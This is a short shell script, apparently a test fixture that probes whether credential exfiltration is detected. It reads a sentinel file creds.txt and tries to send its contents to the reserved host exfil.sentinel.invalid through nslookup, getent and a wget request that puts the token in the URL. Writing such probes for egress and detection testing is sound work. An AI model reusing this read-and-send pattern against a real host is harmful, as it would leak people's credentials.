#!/bin/sh
# Deterministic exfil-probe (v1) for the pat-in-log fixture. Reads the
# file-resident sentinel (creds.txt, carried in the fixture bundle) and attempts
# to exfil it to the marked host endpoint exfil.sentinel.invalid. This vector is
# scored on the DNS query: the resolution attempt is captured on the tap before
# the drop. exfil.sentinel.invalid is RFC-2606 reserved and can never resolve.
set -u
PAT="$(cat ./creds.txt 2>/dev/null || echo unset)"
timeout 8 sh -c \
  "nslookup exfil.sentinel.invalid || getent hosts exfil.sentinel.invalid || wget -q -T4 -O- 'http://exfil.sentinel.invalid/p?t=${PAT}'" \
  || true
